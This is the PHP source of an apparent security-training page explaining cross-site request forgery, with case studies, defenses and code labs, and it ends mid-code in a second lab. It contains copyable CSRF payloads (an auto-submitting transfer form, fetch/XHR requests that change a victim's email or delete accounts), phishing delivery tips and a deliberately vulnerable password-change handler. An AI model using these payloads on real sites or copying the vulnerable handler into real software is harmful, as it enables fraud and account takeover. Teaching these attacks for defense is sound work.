<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;


$pageTitle = "Cross-Site Request Forgery (CSRF) - Complete Guide | DarkHunter";
$currentPage = "csrf-module";
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="Master Cross-Site Request Forgery (CSRF) - Understanding session riding attacks and implementing robust defenses. Complete cybersecurity training module.">
  <title><?php echo $pageTitle; ?></title>

  <!-- Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/csrf-info.css?v=1.1">

</head>

<body>
  <div class="grid-bg"></div>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <!-- Mobile Menu Button -->
  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>

  <div class="app-container">
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>
    <!-- Sidebar -->
    <aside class="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-brand">
          👾 <span>DARK</span>HUNTER
        </div>
      </div>

      <div class="nav-section">
        <div class="nav-title">Navigation</div>
        <ul class="nav-links">
          <li>
            <a href="#overview" class="active">
              <i>📚</i> Overview
            </a>
          </li>
          <li>
            <a href="#mechanism">
              <i>⚙️</i> How It Works
            </a>
          </li>
          <li>
            <a href="#exploitation">
              <i>🎯</i> Exploitation Steps
            </a>
          </li>
          <li>
            <a href="#impact">
              <i>💥</i> Real-World Impact
            </a>
          </li>
          <li>
            <a href="#labs">
              <i>💻</i> Code Labs
            </a>
          </li>
          <li>
            <a href="#bypass">
              <i>🚧</i> Bypass Techniques
            </a>
          </li>
          <li>
            <a href="#mitigation">
              <i>🛡️</i> Prevention
            </a>
          </li>
        </ul>
      </div>

      <div class="nav-section">
        <div class="nav-title">Related Modules</div>
        <ul class="nav-links">
          <li>
            <a href="/DarkHunter/learningBugs/xss-info.php">
              <i>💻</i> XSS
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/sqli-info.php">
              <i>🗃️</i> SQL Injection
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/idor-info.php">
              <i>🆔</i> IDOR
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/ssrf-info.php">
              <i>🌐</i> SSRF
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/ssti-info.php">
              <i>🧪</i> SSTI
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/cors-info.php">
              <i>🔗</i> CORS
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/file-upload-info.php">
              <i>📤</i> File Upload
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/cache-poisoning-info.php">
              <i>🧃</i> Cache Poisoning
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/host-header-info.php">
              <i>🖥️</i> Host Header Injection
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/oauth-info.php">
              <i>🔑</i> OAUTH
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/http-smuggling-info.php">
              <i>📦</i> HTTP Smuggling
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/html-injection-info.php">
              <i>📝</i> HTML Injection
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/lfi-info.php">
              <i>📁</i> LFI
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/jwt-info.php">
              <i>🎫</i> JWT
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/open-redirect-info.php">
              <i>↪️</i> Open Redirect
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/rce-info.php">
              <i>💻</i> RCE
            </a>
          </li>
          <li>
            <a href="/DarkHunter/learningBugs/race-condition-info.php">
              <i>⚡</i> Race Condition
            </a>
          </li>
        </ul>
      </div>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
      <!-- Page Header -->
      <div class="page-header">
        <h1 class="page-title">Cross-Site Request Forgery (CSRF)</h1>
        <p class="page-subtitle">
          Master the art of understanding and defending against session riding attacks. Learn how attackers force users
          to
          execute unwanted actions on authenticated web applications.
        </p>
      </div>

      <!-- Table of Contents -->
      <div class="content-card">
        <div class="toc">
          <div class="toc-title">📋 Table of Contents</div>
          <ul class="toc-list">
            <li><a href="#overview">1. What is CSRF?</a></li>
            <li><a href="#mechanism">2. Technical Mechanism</a></li>
            <li><a href="#exploitation">3. Exploitation Steps</a></li>
            <li><a href="#impact">4. Real-World Impact</a></li>
            <li><a href="#labs">5. Code Labs: Vulnerable vs Secure</a></li>
            <li><a href="#bypass">6. Bypass Techniques</a></li>
            <li><a href="#mitigation">7. Prevention Checklist</a></li>
          </ul>
        </div>
      </div>

      <!-- Section 1: Overview -->
      <div id="overview" class="content-card">
        <h2 class="card-title">
          <i>📚</i> What is Cross-Site Request Forgery (CSRF)?
        </h2>

        <div class="highlight-box">
          <strong>Definition:</strong> Cross-Site Request Forgery (CSRF), also known as Session Riding or One-Click
          Attack, is an attack that forces authenticated users to execute unwanted actions on a web application where
          they are currently authenticated. It exploits the trust that a web application has in the user's browser.
        </div>

        <p class="text-content">
          Unlike XSS, which exploits the trust a user has in a particular site, CSRF exploits the trust that a site has
          in
          the user's browser. When you authenticate with a website, the server establishes a session and typically
          stores
          a session cookie in your browser. This cookie is automatically sent with every subsequent request to that
          domain—legitimate or malicious.
        </p>

        <div class="danger-box">
          <strong>⚠️ Critical Impact:</strong> CSRF can lead to unauthorized fund transfers, password changes, email
          address modifications, privilege escalation, data theft, and complete account takeover. While the user never
          sees the attack happening, their authenticated session is hijacked to perform actions they never intended.
        </div>

        <h3 class="subsection-title">CVSS Severity Assessment</h3>
        <div class="highlight-box">
          <strong>CVSS Score Range: 6.5 - 8.8 (Medium to High)</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Attack Vector:</strong> Network (remotely exploitable)</li>
            <li><strong>Attack Complexity:</strong> Low (requires some social engineering)</li>
            <li><strong>Privileges Required:</strong> None (exploits existing user session)</li>
            <li><strong>User Interaction:</strong> Required (victim must click malicious link)</li>
            <li><strong>Scope:</strong> Unchanged (affects the vulnerable application)</li>
            <li><strong>Impact:</strong> High on Integrity (actions performed as victim)</li>
          </ul>
        </div>

        <h3 class="subsection-title">CSRF vs XSS: Understanding the Difference</h3>
        <p class="text-content">
          While often confused, CSRF and XSS are fundamentally different attacks with different mechanisms and defenses:
        </p>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse; margin-top: 1rem;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Aspect</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">CSRF</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">XSS</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Exploits Trust In</td>
              <td style="padding: 0.75rem;">Website → User's Browser</td>
              <td style="padding: 0.75rem;">User → Website</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Requires Script Injection</td>
              <td style="padding: 0.75rem;">No</td>
              <td style="padding: 0.75rem;">Yes</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Can Read Response</td>
              <td style="padding: 0.75rem;">No (blind attack)</td>
              <td style="padding: 0.75rem;">Yes (same-origin)</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Primary Defense</td>
              <td style="padding: 0.75rem;">CSRF Tokens, SameSite Cookies</td>
              <td style="padding: 0.75rem;">Output Encoding, CSP</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">User Awareness</td>
              <td style="padding: 0.75rem;">Invisible to victim</td>
              <td style="padding: 0.75rem;">May see suspicious behavior</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">📊 CSRF Attack Flow Diagram</div>
          <div class="diagram-placeholder">
            <i>🖼️</i><br>
            [Insert Diagram: User Authenticates → Visits Malicious Site → Forged Request Sent → Server Executes as
            Legitimate User]
          </div>
        </div>
      </div>

      <!-- Section 2: Mechanism -->
      <div id="mechanism" class="content-card">
        <h2 class="card-title">
          <i>⚙️</i> How CSRF Works: Technical Deep Dive
        </h2>

        <h3 class="subsection-title">The Same-Origin Policy Loophole</h3>
        <p class="text-content">
          CSRF exploits a fundamental characteristic of web browsers: <strong>cookies are sent automatically with every
            request to their originating domain</strong>, regardless of where the request originated from. This is not a
          bug—it's how the web is designed to maintain user sessions. However, this design creates a vulnerability when
          applications don't verify the origin or intent of requests.
        </p>

        <div class="highlight-box">
          <strong>The Three Conditions Required for CSRF:</strong>
          <ol style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Action:</strong> There is a state-changing action the attacker wants to perform (transfer funds,
              change password, elevate privileges)</li>
            <li><strong>Cookie-Based Session Handling:</strong> The application uses session cookies to identify users
            </li>
            <li><strong>No Unpredictable Parameters:</strong> The request parameters are predictable or known to the
              attacker</li>
          </ol>
        </div>

        <h3 class="subsection-title">The Attack Chain</h3>

        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-icon attack">1️⃣</div>
            <div class="flow-label">Victim Authentication</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">User logs into bank.com and
              receives session cookie</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">2️⃣</div>
            <div class="flow-label">Visit Malicious Site</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">User visits evil.com in
              another tab while bank.com session is active</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon victim">3️⃣</div>
            <div class="flow-label">Forged Request</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">evil.com sends crafted request
              to bank.com/transfer</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon attack">4️⃣</div>
            <div class="flow-label">Cookie Auto-Sent</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Browser automatically includes
              bank.com session cookie</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">5️⃣</div>
            <div class="flow-label">Server Executes</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">bank.com processes request as
              legitimate user action</p>
          </div>
        </div>

        <h3 class="subsection-title">Request Types and CSRF Risk</h3>

        <div class="warning-box">
          <strong>GET Requests:</strong> Historically considered "safe" but can still be exploited if the application
          performs state-changing actions via GET parameters. Attackers can trigger GET requests through:
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><code class="font-mono">&lt;img src="http://bank.com/transfer?to=attacker&amount=10000"&gt;</code></li>
            <li><code class="font-mono">&lt;iframe src="...&gt;</code></li>
            <li>CSS background-image URLs (in older browsers)</li>
          </ul>
        </div>

        <div class="danger-box">
          <strong>POST/PUT/DELETE Requests:</strong> More dangerous as these are designed for state-changing operations.
          Can be triggered via:
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li>Auto-submitting HTML forms via JavaScript</li>
            <li>XMLHttpRequest/Fetch API with credentials included</li>
            <li>Flash-based requests (legacy)</li>
          </ul>
        </div>

        <h3 class="subsection-title">SameSite Cookies: The Modern Defense</h3>
        <p class="text-content">
          The SameSite cookie attribute was introduced to prevent CSRF by controlling when cookies are sent in
          cross-origin requests:
        </p>

        <div class="code-block">
          <div class="code-header">
            <span class="code-label">SameSite Cookie Values</span>
          </div>
          <pre><code><span class="code-comment">-- Strict: Cookie never sent in cross-site requests</span>
<span class="code-attr">Set-Cookie</span>: <span class="code-string">session=abc123; SameSite=Strict; Secure; HttpOnly</span>

<span class="code-comment">-- Lax: Cookie sent for top-level navigation GET requests only (default in modern browsers)</span>
<span class="code-attr">Set-Cookie</span>: <span class="code-string">session=abc123; SameSite=Lax; Secure; HttpOnly</span>

<span class="code-comment">-- None: Cookie sent with all requests (requires Secure attribute)</span>
<span class="code-attr">Set-Cookie</span>: <span class="code-string">session=abc123; SameSite=None; Secure; HttpOnly</span></code></pre>
        </div>

        <div class="highlight-box">
          <strong>SameSite=Lax Coverage:</strong>
          <ul style="margin-left: 2rem;">
            <li>✅ Safe: Regular links, form GET, prerender</li>
            <li>❌ Blocked: POST requests, iframe embeds, AJAX, images</li>
            <li>⚠️ Limitation: GET requests that trigger state changes are still vulnerable</li>
          </ul>
        </div>
      </div>

      <!-- Section 3: Exploitation -->
      <div id="exploitation" class="content-card">
        <h2 class="card-title">
          <i>🎯</i> Exploitation Steps: From Discovery to Account Takeover
        </h2>

        <h3 class="subsection-title">Step 1: Reconnaissance and Target Identification</h3>
        <p class="text-content">
          The first step is identifying state-changing operations in the target application that lack CSRF protection.
          Use Burp Suite, OWASP ZAP, or browser DevTools to map the application's functionality.
        </p>

        <div class="highlight-box">
          <strong>Look For:</strong>
          <ul style="margin-left: 2rem;">
            <li>Forms that change passwords, email addresses, or security questions</li>
            <li>Transfer/payment functionality in banking applications</li>
            <li>Privilege escalation endpoints (make user admin)</li>
            <li>Account deletion or data export features</li>
            <li>API endpoints that perform actions via GET requests</li>
          </ul>
        </div>

        <h3 class="subsection-title">Step 2: Analyze Request Structure</h3>
        <p class="text-content">
          Capture legitimate requests and analyze their structure. Check for the absence of:
        </p>
        <ul class="text-content">
          <li>CSRF tokens in headers or body</li>
          <li>Custom headers that trigger CORS preflight</li>
          <li>Double-submit cookie patterns</li>
          <li>Referer/Origin header validation</li>
        </ul>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">Vulnerable Request Analysis (Burp Suite)</span>
          </div>
          <pre><code><span class="code-comment">-- Vulnerable password change request (NO CSRF TOKEN)</span>
<span class="code-keyword">POST</span> /change-password <span class="code-keyword">HTTP/1.1</span>
<span class="code-attr">Host</span>: <span class="code-string">target.com</span>
<span class="code-attr">Content-Type</span>: <span class="code-string">application/x-www-form-urlencoded</span>
<span class="code-attr">Cookie</span>: <span class="code-string">session=authenticated_user_session</span>

<span class="code-string">new_password=password123&confirm_password=password123</span>
<span class="code-comment">-- No csrf_token parameter! VULNERABLE!</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 3: Craft the Malicious Payload</h3>
        <p class="text-content">
          Create an HTML page that automatically submits the forged request when loaded. This can be hosted on any
          server and shared via phishing emails, social media, or malicious advertisements.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">Basic CSRF Attack Form (POST)</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-tag">&lt;!DOCTYPE html&gt;</span>
<span class="code-tag">&lt;html&gt;</span>
<span class="code-tag">&lt;head&gt;</span>
    <span class="code-tag">&lt;title&gt;</span>Security Update Required<span class="code-tag">&lt;/title&gt;</span>
<span class="code-tag">&lt;/head&gt;</span>
<span class="code-tag">&lt;body</span> <span class="code-attr">onload</span>=<span class="code-string">"document.forms[0].submit()"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">&lt;form</span> <span class="code-attr">action</span>=<span class="code-string">"https://bank.com/transfer"</span> <span class="code-attr">method</span>=<span class="code-string">"POST"</span><span class="code-tag">&gt;</span>
        <span class="code-tag">&lt;input</span> <span class="code-attr">type</span>=<span class="code-string">"hidden"</span> <span class="code-attr">name</span>=<span class="code-string">"to_account"</span> <span class="code-attr">value</span>=<span class="code-string">"ATTACKER_ACCOUNT"</span><span class="code-tag">&gt;</span>
        <span class="code-tag">&lt;input</span> <span class="code-attr">type</span>=<span class="code-string">"hidden"</span> <span class="code-attr">name</span>=<span class="code-string">"amount"</span> <span class="code-attr">value</span>=<span class="code-string">"10000"</span><span class="code-tag">&gt;</span>
        <span class="code-tag">&lt;input</span> <span class="code-attr">type</span>=<span class="code-string">"hidden"</span> <span class="code-attr">name</span>=<span class="code-string">"currency"</span> <span class="code-attr">value</span>=<span class="code-string">"USD"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">&lt;/form&gt;</span>
    <span class="code-tag">&lt;p&gt;</span>Processing your security update...<span class="code-tag">&lt;/p&gt;</span>
<span class="code-tag">&lt;/body&gt;</span>
<span class="code-tag">&lt;/html&gt;</span></code></pre>
        </div>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">AJAX-based CSRF (XHR/Fetch)</span>
          </div>
          <pre><code><span class="code-tag">&lt;script&gt;</span>
<span class="code-comment">// Using XMLHttpRequest with credentials</span>
<span class="code-keyword">var</span> xhr = <span class="code-keyword">new</span> <span class="code-function">XMLHttpRequest</span>();
xhr.<span class="code-function">open</span>(<span class="code-string">"POST"</span>, <span class="code-string">"https://target.com/api/change-email"</span>, <span class="code-keyword">true</span>);
xhr.<span class="code-attr">withCredentials</span> = <span class="code-keyword">true</span>;  <span class="code-comment">// Critical: sends cookies</span>
xhr.<span class="code-function">setRequestHeader</span>(<span class="code-string">"Content-Type"</span>, <span class="code-string">"application/json"</span>);
xhr.<span class="code-function">send</span>(<span class="code-function">JSON.stringify</span>({
    email: <span class="code-string">"attacker@evil.com"</span>
}));

<span class="code-comment">// Using Fetch API</span>
<span class="code-function">fetch</span>(<span class="code-string">"https://target.com/api/delete-account"</span>, {
    method: <span class="code-string">"POST"</span>,
    credentials: <span class="code-string">"include"</span>,  <span class="code-comment">// Sends cookies</span>
    headers: {
        <span class="code-string">"Content-Type"</span>: <span class="code-string">"application/json"</span>
    },
    body: <span class="code-function">JSON.stringify</span>({confirm: <span class="code-keyword">true</span>})
});
<span class="code-tag">&lt;/script&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 4: Delivery and Social Engineering</h3>
        <p class="text-content">
          The malicious page must be visited by an authenticated victim. Common delivery methods include:
        </p>

        <div class="highlight-box">
          <strong>Delivery Vectors:</strong>
          <ul style="margin-left: 2rem;">
            <li><strong>Phishing Emails:</strong> "Verify your account" or "Security alert" with malicious link</li>
            <li><strong>Malicious Ads:</strong> Compromised ad networks serving CSRF payloads</li>
            <li><strong>Forum/Comment Injection:</strong> Embedding attack in user-generated content</li>
            <li><strong>URL Shorteners:</strong> Masking malicious URLs behind bit.ly or similar services</li>
            <li><strong>Compromised Legitimate Sites:</strong> Injecting CSRF code into hacked websites</li>
          </ul>
        </div>

        <h3 class="subsection-title">Step 5: Exploitation with Burp Suite</h3>
        <p class="text-content">
          Burp Suite Professional includes a CSRF PoC generator that automates payload creation:
        </p>

        <ol class="text-content">
          <li>Intercept the legitimate request in Burp Proxy</li>
          <li>Right-click and select "Engagement Tools" → "Generate CSRF PoC"</li>
          <li>Burp automatically creates an HTML form with all parameters</li>
          <li>Test in browser using "Test in browser" feature</li>
          <li>Copy the generated HTML and host it on your malicious server</li>
        </ol>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: CSRF Exploitation with Burp Suite</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Step-by-step CSRF exploitation using Burp Suite Pro]
          </div>
        </div>
      </div>

      <!-- Section 4: Impact -->
      <div id="impact" class="content-card">
        <h2 class="card-title">
          <i>💥</i> Real-World Impact: Notorious CSRF Attacks
        </h2>

        <h3 class="subsection-title">Case Study 1: The 2008 uTorrent CSRF Vulnerability</h3>
        <p class="text-content">
          uTorrent's web interface lacked CSRF protection, allowing attackers to change the download directory to any
          location on the victim's computer. By visiting a malicious page, victims could have malware automatically
          downloaded and executed.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Remote code execution on millions of users' machines. Attackers could download
          arbitrary files to sensitive locations like Startup folders.
        </div>

        <h3 class="subsection-title">Case Study 2: Netflix Password Change CSRF (2014)</h3>
        <p class="text-content">
          Security researchers discovered that Netflix's password change functionality lacked proper CSRF tokens. An
          attacker could change a victim's password by having them visit a malicious page while logged into Netflix.
        </p>
        <div class="warning-box">
          <strong>Attack Chain:</strong> Victim logs into Netflix → Visits malicious site → Password changed to
          attacker-controlled → Attacker locks out legitimate user and accesses viewing history/payment info.
        </div>

        <h3 class="subsection-title">Case Study 3: ING Direct Bank Transfer Vulnerability</h3>
        <p class="text-content">
          ING Direct's online banking platform was found vulnerable to CSRF attacks that could transfer funds between
          accounts. The attack required the victim to be logged in and visit a malicious page.
        </p>
        <div class="highlight-box">
          <strong>Financial Impact:</strong> Potential for mass unauthorized transfers. The vulnerability was patched
          before widespread exploitation, but demonstrated the severity of CSRF in financial applications.
        </div>

        <h3 class="subsection-title">Common Attack Scenarios by Industry</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Industry</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">CSRF Attack Scenario</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Potential Damage</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Banking/Finance</td>
              <td style="padding: 0.75rem;">Unauthorized wire transfers, beneficiary changes</td>
              <td style="padding: 0.75rem;">Direct financial loss, money laundering</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">E-Commerce</td>
              <td style="padding: 0.75rem;">Change shipping address, place orders</td>
              <td style="padding: 0.75rem;">Theft of goods, fraudulent purchases</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Social Media</td>
              <td style="padding: 0.75rem;">Post content, change privacy settings</td>
              <td style="padding: 0.75rem;">Reputation damage, privacy violations</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Cloud Services</td>
              <td style="padding: 0.75rem;">Delete resources, modify access policies</td>
              <td style="padding: 0.75rem;">Data loss, service disruption</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Healthcare</td>
              <td style="padding: 0.75rem;">Modify prescriptions, appointment cancellations</td>
              <td style="padding: 0.75rem;">Patient safety risks, HIPAA violations</td>
            </tr>
          </table>
        </div>
      </div>

      <!-- Section 5: Labs -->
      <div id="labs" class="content-card">
        <h2 class="card-title">
          <i>💻</i> Code Labs: Vulnerable vs Secure Implementation
        </h2>

        <div class="warning-box">
          <strong>🎯 Lab Objective:</strong> Understand how missing CSRF tokens enable session riding attacks, then
          implement multiple defense layers including tokens, SameSite cookies, and custom headers.
        </div>

        <h3 class="subsection-title">Lab 1: Vulnerable Password Change</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> State-changing operation without CSRF token validation.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable PHP Code</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Vulnerable: No CSRF token validation!</span>
<span class="code-keyword">session_start</span>();

<span class="code-keyword">if</span> (<span class="code-keyword">$_SERVER</span>[<span class="code-string">'REQUEST_METHOD'</span>] === <span class="code-string">'POST'</span>) {
    <span class="code-comment">// DANGEROUS: No verification of request origin!</span>
    <span class="code-keyword">$new_password</span> = <span class="code-keyword">$_POST</span>[<span class="code-string">'new_password'</span>];
    <span class="code-keyword">$user_id</span> = <span class="code-keyword">$_SESSION</span>[<span class="code-string">'user_id'</span>];
    
    <span class="code-comment">// Directly updates password - CSRF vulnerable!</span>
    <span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<span class="code-string">"UPDATE users SET password = ? WHERE id = ?"</span>);
    <span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([<span class="code-function">password_hash</span>(<span class="code-keyword">$new_password</span>, <span class="code-keyword">PASSWORD_DEFAULT</span>), <span class="code-keyword">$user_id</span>]);
    
    <span class="code-keyword">echo</span> <span class="code-string">"Password changed successfully!"</span>;
}
<span class="code-keyword">?&gt;</span>

<span class="code-comment">&lt;!-- HTML Form (also vulnerable - no token) --&gt;</span>
<span class="code-tag">&lt;form</span> <span class="code-attr">method</span>=<span class="code-string">"POST"</span> <span class="code-attr">action</span>=<span class="code-string">"/change-password"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">&lt;input</span> <span class="code-attr">type</span>=<span class="code-string">"password"</span> <span class="code-attr">name</span>=<span class="code-string">"new_password"</span> <span class="code-attr">placeholder</span>=<span class="code-string">"New Password"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">&lt;button</span> <span class="code-attr">type</span>=<span class="code-string">"submit"</span><span class="code-tag">&gt;</span>Change Password<span class="code-tag">&lt;/button&gt;</span>
<span class="code-tag">&lt;/form&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Implementation (Synchronizer Token Pattern)</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">session_start</span>();

<span class="code-comment">// Generate CSRF token if not exists</span>
<span class="code-keyword">if</span> (<span class="code-keyword">empty</span>(<span class="code-keyword">$_SESSION</span>[<span class="code-string">'csrf_token'</span>])) {
    <span class="code-keyword">$_SESSION</span>[<span class="code-string">'csrf_token'</span>] = <span class="code-function">bin2hex</span>(<span class="code-function">random_bytes</span>(<span class="code-keyword">32</span>));
}

<span class="code-keyword">function</span> <span class="code-function">validateCsrfToken</span>(<span class="code-keyword">$token</span>) {
    <span class="code-keyword">return</span> <span class="code-function">hash_equals</span>(<span class="code-keyword">$_SESSION</span>[<span class="code-string">'csrf_token'</span>], <span class="code-keyword">$token</span>);
}

<span class="code-keyword">if</span> (<span class="code-keyword">$_SERVER</span>[<span class="code-string">'REQUEST_METHOD'</span>] === <span class="code-string">'POST'</span>) {
    <span class="code-comment">// CRITICAL: Validate CSRF token before processing</span>
    <span class="code-keyword">if</span> (!<span class="code-function">isset</span>(<span class="code-keyword">$_POST</span>[<span class="code-string">'csrf_token'</span>]) || !<span class="code-function">validateCsrfToken</span>(<span class="code-keyword">$_POST</span>[<span class="code-string">'csrf_token'</span>])) {
        <span class="code-function">http_response_code</span>(<span class="code-keyword">403</span>);
        <span class="code-function">die</span>(<span class="code-string">"CSRF token validation failed"</span>);
    }
    
    <span class="code-comment">// Also validate Origin/Referer headers as defense in depth</span>
    <span class="code-keyword">$allowed_origin</span> = <span class="code-string">"https://example.com"</span>;
    <span class="code-keyword">if</span> (<span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_ORIGIN'</span>] !== <span class="code-keyword">$allowed_origin</span>) {
        <span class="code-function">die</span>(<span class="code-string">"Invalid origin"</span>);
    }
    
    <span class="code-comment">// Process the legitimate request</span>
    <span class="code-keyword">$new_password</span> = <span class="code-keyword">$_POST</span>[<span class="code-string">'new_password'</span>];
    <span class="code-comment">// ... password update logic ...</span>
}
<span class="code-keyword">?&gt;</span>

<span class="code-comment">&lt;!-- Secure Form with CSRF Token --&gt;</span>
<span class="code-tag">&lt;form</span> <span class="code-attr">method</span>=<span class="code-string">"POST"</span> <span class="code-attr">action</span>=<span class="code-string">"/change-password"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">&lt;input</span> <span class="code-attr">type</span>=<span class="code-string">"hidden"</span> <span class="code-attr">name</span>=<span class="code-string">"csrf_token"</span> <span class="code-attr">value</span>=<span class="code-string">"&lt;?php echo $_SESSION['csrf_token']; ?&gt;"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">&lt;input</span> <span class="code-attr">type</span>=<span class="code-string">"password"</span> <span class="code-attr">name</span>=<span class="code-string">"new_password"</span> <span class="code-attr">placeholder</span>=<span class="code-string">"New Password"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">&lt;button</span> <span class="code-attr">type</span>=<span class="code-string">"submit"</span><span class="code-tag">&gt;</span>Change Password<span class="code-tag">&lt;/button&gt;</span>
<span class="code-tag">&lt;/form&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 2: Double Submit Cookie Pattern</h3>
        <p class="text-content">
          An alternative to server-side token storage, useful for stateless applications or when session storage is
          limited.
        </p>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">Double Submit Cookie Implementation</span>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">class</span> <span class="code-function">CsrfProtection</span> {
    <span class="code-keyword">private</span> <span class="code-keyword">$cookie_name</span> = <span class="code-string">'csrf_token'</span>;
    
    <span class="code-keyword">public function</span> <span class="code-function">generateToken</span>() {
        <span class="code-keyword">$token</span> = <span class="code-function">bin2hex</span>(<span class="code-function">random_bytes</span>(<span class="code-keyword">32</span>));
        <span class="code-function">setcookie</span>(<span class="code-keyword">$this</span>-><span class="code-attr">cookie_name</span>, <span class="code-keyword">$token</span>, [
            <span class="code-string">'expires'</span> => <span class="code-keyword">time</span>() + <span class="code-keyword">3600</span>,
            <span class="code-string">'path'</span> => <span class="code-string">'/'</span>,
            <span class="code-string">'secure'</span> => <span class="code-keyword">true</span>,
